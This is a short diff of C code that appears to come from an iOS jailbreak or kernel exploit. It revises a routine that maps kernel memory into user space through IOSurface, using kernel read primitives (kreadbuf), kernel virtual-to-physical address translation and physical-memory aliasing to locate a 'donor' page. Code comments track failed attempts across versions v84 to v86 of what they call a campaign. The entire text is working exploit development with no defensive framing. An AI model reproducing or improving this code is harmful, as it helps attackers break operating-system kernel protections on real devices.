@@ -289,12 +289,19 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
-	uint64_t elemPA = vtophys(ttP, elemVA) & ~0x3FFFULL;
+	uint64_t elemPA = kvtophys(elemVA);
 	if (!elemPA) {
-		jb_tr_beacon("KMAP fail,elemvtophys");
-		*uaddr = NULL;
-		return -1;
+		// v86: elemVA is a KERNEL VA — vtophys (user walk) can never
+		// translate it (v85's fail,elemvtophys ×8). kvtophys is the
+		// kernel-VA translator used campaign-wide.
+		elemPA = vtophys(ttP, elemVA) & ~0x3FFFULL;
+		if (!elemPA) {
+			jb_tr_beacon("KMAP fail,elemPA,va=%llx", (unsigned long long)elemVA);
+			*uaddr = NULL;
+			return -1;
+		}
 	}
+	uint64_t elemOff   = elemVA & 0x3FFFULL;   // element's offset in its page
 	uint64_t elemAlias = phystokv(elemPA);
 	if (!elemAlias) {
 		jb_tr_beacon("KMAP fail,elemalias,pa=%llx", (unsigned long long)elemPA);
@@ -302,7 +309,9 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		return -1;
 	}
 	uint64_t rangesPair[2];
-	kreadbuf(elemAlias, rangesPair, sizeof(rangesPair));
+	// v86: read at the element's PAGE OFFSET — v84/v85 read the alias page
+	// base, which would have been garbage even with a working translation.
+	kreadbuf(elemAlias + elemOff, rangesPair, sizeof(rangesPair));
 	uint64_t donorPA = rangesPair[0] & ~0x3FFFULL;
 	jb_tr_beacon("KMAP donor,elemva=%llx,elemalias=%llx,pa=%llx,size=%llx",
 	             (unsigned long long)elemVA, (unsigned long long)elemAlias,
